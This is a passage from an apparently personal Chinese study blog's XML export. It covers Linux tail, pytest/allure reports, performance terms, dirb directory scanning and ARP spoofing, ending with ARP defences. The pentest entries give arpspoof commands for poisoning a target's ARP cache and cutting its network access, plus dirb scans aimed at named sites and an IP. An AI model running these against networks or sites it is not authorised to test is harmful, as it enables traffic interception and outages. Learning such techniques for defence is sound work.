<p>**tail -c 10 test.txt **<br />注：数字、字母、空格占1个字节<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646654748314-e9898686-c2e4-44ee-b984-ccb1edf04fce.png#averageHue=%23fdf6f5&clientId=u581b7dae-b671-4&from=paste&height=242&id=u4cfc8f7a&originHeight=270&originWidth=520&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19828&status=done&style=none&taskId=u0ccdbc68-0fcf-420e-8a8f-db8995ea468&title=&width=467" alt="image.png"><br /><strong>tail -n +20 test.txt</strong> （注意有个+号，表示正序第20行开始到结尾的内容）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646655385328-20dd8096-aa89-475e-a795-4a5d14554f0c.png#averageHue=%23fefefe&clientId=u581b7dae-b671-4&from=paste&height=151&id=ufe077982&originHeight=153&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5466&status=done&style=none&taskId=u165108b5-6431-42ee-9ca8-ab47771166f&title=&width=500" alt="image.png"><br /><strong>tail -n 20 test.txt</strong> （倒数20行的内容）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646655491866-0633a99f-e9ae-4846-b54b-8c1ebed8d0a7.png#averageHue=%23fdfdfd&clientId=u581b7dae-b671-4&from=paste&height=335&id=ub8bfa4c4&originHeight=409&originWidth=519&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15175&status=done&style=none&taskId=u690d65ae-7191-4025-a9f8-6d4003ae64d&title=&width=425.5" alt="image.png"></p>
]]></content>
      <categories>
        <category>软件测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>生成测试报告</title>
    <url>/2023/07/13/%E7%94%9F%E6%88%90%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<p>1、第一种：生成pytest内置报告，输入<br />pytest -vs –html .&#x2F;reports&#x2F;result.html<br />生成result.html文件<br />2、第二种：生成allure报告 <br />生成报告：allure serve reports&#x2F;allure_raw<br />开启服务查看报告：allure serve reports&#x2F;allure_raw</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一步--运行用例并生成报告</span><br><span class="line">（<span class="number">1</span>）前提是pytest.ini中已经设置了生成报告的命令：addopts=-vs --alluredir=./reports/allure_raw --clean-alluredir</span><br><span class="line">pytest  //运行所有用例</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）命令行使用allure </span><br><span class="line">pytest --alluredir=./reports/allure_raw</span><br><span class="line"></span><br><span class="line">第二步 启动服务并查看</span><br><span class="line">allure serve reports/allure_raw</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>allure用法<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1666928057544-5b5cbf5e-a183-48b3-997c-09917734da68.png#averageHue=%23fdfcee&clientId=u47706513-4bb7-4&from=paste&id=u9413bdce&originHeight=530&originWidth=613&originalType=url&ratio=1&rotation=0&showTitle=false&size=43059&status=done&style=none&taskId=u89a544e6-3fe6-47fb-9f63-dc77718ea16&title=" alt="image.png"></p>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>pytest</tag>
        <tag>allure</tag>
      </tags>
  </entry>
  <entry>
    <title>目录扫描工具-dirb、dirbuster</title>
    <url>/2023/05/06/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-dirb%E3%80%81dirbuster/</url>
    <content><![CDATA[<p><a name="ymqfO"></a></p>
<h1 id="一、kali自带扫描工具-dirb"><a href="#一、kali自带扫描工具-dirb" class="headerlink" title="一、kali自带扫描工具-dirb"></a>一、kali自带扫描工具-dirb</h1><p><a name="llkVi"></a></p>
<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><blockquote>
<p>dirb是一个基于字典的Web目录扫描工具（kalI自带），采用递归的方式去获取更多的目录；<br>可以查找到已知的和隐藏的目录；<br>支持代理，延迟访问和添加请求头。</p>
</blockquote>
<p><a name="SiMTP"></a></p>
<h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>大多数情况下，如果对一个网站的语言不清楚，可以直接使用dirb进行扫描，但访问过多会被封IP，所以最好使用时<strong>设置参数</strong><br><a name="mEknu"></a></p>
<h5 id="直接使用："><a href="#直接使用：" class="headerlink" title="直接使用："></a>直接使用：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dirb 域名/主机ip</span><br><span class="line">示例：</span><br><span class="line">dirb http://dc-<span class="number">2</span>/</span><br><span class="line">dirb http://<span class="number">114.67</span><span class="number">.175</span><span class="number">.24</span>:<span class="number">17896</span></span><br></pre></td></tr></table></figure>
<p><a name="brycL"></a></p>
<h5 id="加参数："><a href="#加参数：" class="headerlink" title="加参数："></a>加参数：</h5><table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>设置User-Agent</td>
</tr>
<tr>
<td>-p</td>
<td>proxy，设置代理</td>
</tr>
<tr>
<td>-c</td>
<td>cookie，设置cookie</td>
</tr>
<tr>
<td>-z</td>
<td>设置访问间的延迟，单位毫秒（可以避免ip被封）</td>
</tr>
<tr>
<td>-o</td>
<td>oupput，可以控制输出结果到指定的路径文件中</td>
</tr>
<tr>
<td>-X（大写）</td>
<td>如果已经确定要扫描的文件后缀，可以使用此参数，直接加上后缀（某种程度上可以减少扫描）</td>
</tr>
<tr>
<td>-i</td>
<td>不区分大小写</td>
</tr>
<tr>
<td>-H</td>
<td>添加请求头</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用/usr/share/wordlists/dirb/big.txt字典来扫描Web服务</span></span><br><span class="line">dirb https://www.baidu.com /usr/share/wordlists/dirb/big.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将扫描结果保存到文件中</span></span><br><span class="line">dirb https://www.baidu.com -o output.txt /usr/share/wordlists/dirb/big.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列举指定后缀名目录</span></span><br><span class="line">dirb https://www.baidu.com -X .php /usr/share/wordlists/dirb/big.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加毫秒延迟，避免洪水攻击（单位是毫秒）</span></span><br><span class="line">dirb https://www.baidu.com/ -z <span class="number">100</span></span><br></pre></td></tr></table></figure>
<p>扩展：<br />common.txt被设置为目录遍历的默认单词列表，后期可以把自己觉得好的目录名字，追加到这个字典中，进一步完善字典（路径：&#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt）</p>
<p><a name="FP4fr"></a></p>
<h1 id="二、kali自带扫描工具-dirbuster"><a href="#二、kali自带扫描工具-dirbuster" class="headerlink" title="二、kali自带扫描工具-dirbuster"></a>二、kali自带扫描工具-dirbuster</h1><blockquote>
<p> DirBuster目录扫描工具支持全部的Web目录扫描方式。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。这个软件kali系统自带有，我们可以直接使用，操作也很简单。  </p>
</blockquote>
<p><img src="/images/1683109509530-b39c805b-c26d-4adb-84e4-2ea1f54ba74e.png" alt="1683109509530-b39c805b-c26d-4adb-84e4-2ea1f54ba74e.png"></p>
<p><img src="/images/4ef82c6e023542719ddab478fef94e64.png" alt="4ef82c6e023542719ddab478fef94e64"><img src="/images/803e21b689974a809e1d20efa76eb114.png" alt="803e21b689974a809e1d20efa76eb114"></p>
<h1 id="三、其它扫描工具–gobuster、dirsearch、nikto"><a href="#三、其它扫描工具–gobuster、dirsearch、nikto" class="headerlink" title="三、其它扫描工具–gobuster、dirsearch、nikto"></a>三、其它扫描工具–gobuster、dirsearch、nikto</h1><p>后续学习</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>软件性能的几个主要术语</title>
    <url>/2023/02/27/%E8%BD%AF%E4%BB%B6%E6%80%A7%E8%83%BD%E7%9A%84%E5%87%A0%E4%B8%AA%E4%B8%BB%E8%A6%81%E6%9C%AF%E8%AF%AD/</url>
    <content><![CDATA[<p>来源：<a href="http://www.ha97.com/5095.html">http://www.ha97.com/5095.html</a><br><a name="UsW2k"></a></p>
<h3 id="1、响应时间：对请求作出响应所需要的时间"><a href="#1、响应时间：对请求作出响应所需要的时间" class="headerlink" title="1、响应时间：对请求作出响应所需要的时间"></a>1、响应时间：对请求作出响应所需要的时间</h3><p>网络响应（传输）时间：W1+W2+W3+W4<br />前端响应时间：B1、B2<br />服务器响应时间：S1、S2<br />数据库处理时间：D<br /><strong>响应时间</strong>&#x3D;B1+W1+S1+W2+D+W3+S2+W4+B2<br />（<strong>网络传输时间+前端响应时间+应用服务器处理时间+数据库处理时间</strong>）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1668351149410-029ce6a4-12eb-4f46-a885-9bc68de4bf0a.png#averageHue=%23e0d135&clientId=u88593cfc-90ab-4&from=paste&height=84&id=u5fad5fef&originHeight=105&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42356&status=done&style=none&taskId=u28bd7283-7b2d-4adb-b62a-36a7857d62c&title=&width=463.2" alt="image.png"><br><a name="hPEl1"></a></p>
<h3 id="2、并发用户数的计算公式"><a href="#2、并发用户数的计算公式" class="headerlink" title="2、并发用户数的计算公式"></a>2、并发用户数的计算公式</h3><p><strong>系统用户数</strong>：系统额定的用户数量，如一个OA系统，可能使用该系统的用户总数是5000个，那么这个数量，就是系统用户数。<br /><strong>同时在线用户数</strong>：在一定的时间范围内，最大的同时在线用户数量。<br />同时在线用户数&#x3D;每秒请求数RPS（吞吐量）+并发连接数+平均用户思考时间<br />平均并发用户数的计算：C&#x3D;nL &#x2F; T<br />其中C是平均的并发用户数，n是平均每天访问用户数（login session），L是一天内用户从登录到退出的平均时间（login session的平均时间），T是考察时间长度（一天内多长时间有用户使用系统）<br />并发用户数峰值计算：C^约等于C + 3*根号C<br />其中C^是并发用户峰值，C是平均并发用户数，该公式遵循泊松分布理论。</p>
<p><a name="EUlI6"></a></p>
<h3 id="3、吞吐量的计算公式"><a href="#3、吞吐量的计算公式" class="headerlink" title="3、吞吐量的计算公式"></a>3、吞吐量的计算公式</h3><p>指单位时间内系统处理用户的请求数<br />从业务角度看，吞吐量可以用：请求数&#x2F;秒、页面数&#x2F;秒、人数&#x2F;天或处理业务数&#x2F;小时等单位来衡量<br />从网络角度看，吞吐量可以用：字节&#x2F;秒来衡量<br />对于交互式应用来说，吞吐量指标反映的是服务器承受的压力，他能够说明系统的负载能力<br />以不同方式表达的吞吐量可以说明不同层次的问题，例如，以<strong>字节数&#x2F;秒</strong>方式可以表示数要受网络基础设施、服务器架构、应用服务器制约等方面的瓶颈；<strong>已请求数&#x2F;秒</strong>的方式表示主要是受应用服务器和应用代码的制约体现出的瓶颈。<br />当没有遇到性能瓶颈的时候，吞吐量与虚拟用户数之间存在一定的联系，可以采用以下公式计算：F&#x3D;VU * R &#x2F;<br />其中F为吞吐量，VU表示虚拟用户个数，R表示每个虚拟用户发出的请求数，T表示性能测试所用的时间<br><a name="nllpJ"></a></p>
<h3 id="4、性能计数器"><a href="#4、性能计数器" class="headerlink" title="4、性能计数器"></a>4、性能计数器</h3><p>是描述服务器或操作系统性能的一些数据指标，如使用内存数、进程时间，在性能测试中发挥着“监控和分析”的作用，尤其是在分析统统可扩展性、进行新能瓶颈定位时有着非常关键的作用。<br />资源利用率：指系统各种资源的使用情况，如cpu占用率为68%，内存占用率为55%，一般使用“资源实际使用&#x2F;总的资源可用量”形成资源利用率。<br><a name="o1Xp3"></a></p>
<h3 id="5、思考时间的计算公式"><a href="#5、思考时间的计算公式" class="headerlink" title="5、思考时间的计算公式"></a>5、思考时间的计算公式</h3><p>Think Time，从业务角度来看，这个时间指用户进行操作时每个请求之间的时间间隔，而在做性能测试时，为了模拟这样的时间间隔，引入了思考时间这个概念，来更加真实的模拟用户的操作。<br />在吞吐量这个公式中F&#x3D;VU * R &#x2F; T说明吞吐量F是VU数量、每个用户发出的请求数R和时间T的函数，而其中的R又可以用时间T和用户思考时间TS来计算：R &#x3D; T &#x2F; TS<br />下面给出一个计算思考时间的一般步骤：<br />A、首先计算出系统的并发用户数<br />C&#x3D;nL &#x2F; T F&#x3D;R×C<br />B、统计出系统平均的吞吐量<br />F&#x3D;VU * R &#x2F; T R×C &#x3D; VU * R &#x2F; T<br />C、统计出平均每个用户发出的请求数量<br />R&#x3D;u<em>C</em>T&#x2F;VU<br />D、根据公式计算出思考时间<br />TS&#x3D;T&#x2F;R</p>
<p><a name="cuEjU"></a></p>
<h3 id="6、TPS、QPS、RT"><a href="#6、TPS、QPS、RT" class="headerlink" title="6、TPS、QPS、RT"></a>6、TPS、QPS、RT</h3><p><a name="cUQOQ"></a></p>
<h4 id="6-1-TPS"><a href="#6-1-TPS" class="headerlink" title="6.1 TPS"></a>6.1 TPS</h4><p>即Transactions Per Second的缩写，<strong>每秒处理的事务数目</strong>。一个事务是指一个客户机向服务器发送请求而后服务器作出反应的过程(完整处理，即客户端发起请求到获得响应)。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数，最终利用这些信息做出的评估分。一个事务可能对应多个请求，能够参考下数据库的事务操作。<br><a name="jACcQ"></a></p>
<h4 id="6-2-QPS"><a href="#6-2-QPS" class="headerlink" title="6.2 QPS"></a>6.2 QPS</h4><p>QPS 即Queries Per Second的缩写，<strong>每秒能处理查询数目</strong>(完整处理，即客户端发起请求到获得响应)。是一台服务器每秒可以相应的查询次数，是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。<br />	咱们从它的英文全名能够得出它是查询意思，原来在因特网上，做为域名系统服务器的机器的性能常常用每秒查询率来衡量。对应fetches&#x2F;sec，即每秒的响应请求数。 虽然名义上是查询的意思，但实际上，如今习惯于对单一接口服务的处理能力用QPS进行表述（即便它并非查询操做）。<br><a name="zps6U"></a></p>
<h4 id="6-3-RT-平均处理时间"><a href="#6-3-RT-平均处理时间" class="headerlink" title="6.3 RT(平均处理时间)"></a>6.3 RT(平均处理时间)</h4><p>RT:响应时间，处理一次请求所需要的平均处理时间</p>
<p><a name="QLr34"></a></p>
<h4 id="6-4并发用户数（并发量）"><a href="#6-4并发用户数（并发量）" class="headerlink" title="6.4并发用户数（并发量）"></a>6.4并发用户数（并发量）</h4><p>每秒对待测接口发起请求的用户量</p>
<p>换算关系：<br />QPS &#x3D; 并发数&#x2F;平均响应时间<br />并发量 &#x3D; QPS * 平均响应时间并发</p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>arp攻击</title>
    <url>/2023/07/22/arp%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>需解决问题：</p>
<blockquote>
<p>1、arpsoof是什么东西？<br>2、arp攻击、arp欺骗、arp缓存表是什么？<br>3、反向欺骗是什么？<br>4、如何用arp攻击实现断网？<br>5、如何做arp攻击防御？</p>
</blockquote>
<p><a name="S81XL"></a></p>
<h3 id="1、arpsoof是什么东西？"><a href="#1、arpsoof是什么东西？" class="headerlink" title="1、arpsoof是什么东西？"></a>1、arpsoof是什么东西？</h3><blockquote>
<p>arpsoof是一款进行arp欺骗的工具，攻击者通过<strong>修改受害者arp缓存</strong>，将网关的MAC替换为攻击者的MAC，后续攻击者可截获受害者的所有发送和接收的所有数据包</p>
</blockquote>
<p><img src="/images/img.png" alt="img"></p>
<p><a name="cLZMD"></a></p>
<h3 id="2、arp攻击、arp欺骗、arp缓存表是什么？"><a href="#2、arp攻击、arp欺骗、arp缓存表是什么？" class="headerlink" title="2、arp攻击、arp欺骗、arp缓存表是什么？"></a>2、arp攻击、arp欺骗、arp缓存表是什么？</h3><p>arp缓存表：</p>
<blockquote>
<p>每台主机、网关都有一个ARP缓存表<br>ARP缓存表内记录了其他主机或网关的IP地址与MAC地址的对应关系<br>表中的每条记录实际上就是一个IP与MAC地址对，可以是静态的，也可以是动态的；<br>静态的记录不能被ARP应答包修改，动态的可被ARP应答包修改</p>
</blockquote>
<p>arp攻击：无法通信<br />arp欺骗：窃取数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">相关命令：</span><br><span class="line">arp -s 增加</span><br><span class="line">arp -d 删除</span><br><span class="line">arp -a 查看缓存表  <span class="comment">#这个在windows中可以查看是静态还是动态，linux中只有对应的记录</span></span><br><span class="line">netsh interface ipv4 show neighbors   <span class="comment">#windows中查看缓存表</span></span><br><span class="line">netsh interface ipv4 <span class="built_in">set</span> neighbors 网卡<span class="built_in">id</span> 目标ip 目标mac  <span class="comment">#绑定arp</span></span><br></pre></td></tr></table></figure>
<p><a name="SUXku"></a></p>
<h3 id="3、反向欺骗是什么？"><a href="#3、反向欺骗是什么？" class="headerlink" title="3、反向欺骗是什么？"></a>3、反向欺骗是什么？</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正向欺骗</span></span><br><span class="line">arpsoof -i 网卡 -t 目标主机ip  目标主机网关ip</span><br><span class="line"><span class="comment"># 反射欺骗</span></span><br><span class="line">arpsoof -i 网卡 -t 目标主机网关ip  目标主机ip</span><br></pre></td></tr></table></figure>
<p><img src="/images/img_1.png" alt="img_1"><img src="/images/img_2.png" alt="img_2"><br><a name="Q1DCO"></a></p>
<h3 id="4、如何用arp攻击实现断网？"><a href="#4、如何用arp攻击实现断网？" class="headerlink" title="4、如何用arp攻击实现断网？"></a>4、如何用arp攻击实现断网？</h3><p>开启arp攻击后不开启路由转发，这样目标机的流量只发到攻击者的主机，不会转发到网关，也就无法得到回应，实现断网</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 两种命令 其中1表示开启 0表示关闭</span></span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">sysctl -w net.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看路由转发状态</span></span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="weMKu"></a></p>
<h3 id="5、如何做arp攻击防御？"><a href="#5、如何做arp攻击防御？" class="headerlink" title="5、如何做arp攻击防御？"></a>5、如何做arp攻击防御？</h3><p>法一：将网关的mac地址静态绑定（不太现实，必须主机和网关都绑定）<br />方法：</p>
<blockquote>
<p>1、查看网络接口信息</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">netsh interface ipv4 show interface</span><br></pre></td></tr></table></figure>
<blockquote>
<p>2、将网卡绑定</p>
</blockquote>
<blockquote>
<p><strong>（1）静态绑定ARP，真实环境不太现实 必须在主机和网关双向绑定</strong><br>        —–主机上绑定—–<br>        先查看网卡的id<br>        netsh interface ipv4 show neighbors<br>        再进行绑定<br>        语法：netsh interface ipv4 set neighbors 网卡id  目标主机ip地址  目标主机mac地址<br>        示例：netsh interface ipv4 set neighbors 11 10.0.0.178 00-1a-e2-df-07-41<br>        如果是xp系统用：arp  -s  目标主机ip地址  目标主机mac地址<br>     —–网关路由器上绑定—–<br>        语法：Router(config)#arp 目的主机ip地址 目标主机mac地址 arpa 接口<br>        示例：Router(config)#arp 10.0.0.95 0013.240a.b219 arpa f0&#x2F;0<br>        —–交换机上绑定—–<br>        语法：Switch(config)#arp 目的主机ip地址 目标主机mac地址 arpa 接口<br>        示例：Switch(config)#arp 10.0.0.12 90fb.a695.4445 arpa f0&#x2F;2<br>    查看arp缓存表：arp  -a<br>    清除arp缓存表：arp  -d<br><strong>（2）安装ARP防火墙，或企业级防火墙（自带ARP防火墙功能）</strong><br>原文链接：<a href="https://blog.csdn.net/lzl10211345/article/details/126882928">https://blog.csdn.net/lzl10211345/article/details/126882928</a></p>
</blockquote>
<p>法二：安装ARP防火墙，或企业级防火墙（自带ARP防火墙功能）</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
</search>
